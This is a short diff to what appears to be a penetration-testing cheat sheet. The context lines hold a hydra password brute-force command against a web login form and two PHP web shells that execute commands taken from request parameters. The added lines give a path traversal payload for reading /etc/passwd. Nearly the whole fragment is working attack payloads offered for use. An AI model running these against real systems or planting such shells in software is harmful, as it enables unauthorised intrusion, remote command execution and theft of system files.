@@ -206,3 +206,8 @@ hydra -l none -P rockyou.txt <IP> http-post-form "/path/to/login.php:username=ad
 <?php echo system($_REQUEST ["cmd"]); ?>
 <?php system($_GET['cmd']);?>
 ```
+
+### param tampers
+```
+query?param=/legit/path/to/file.php/../../../../etc/passwd
+```
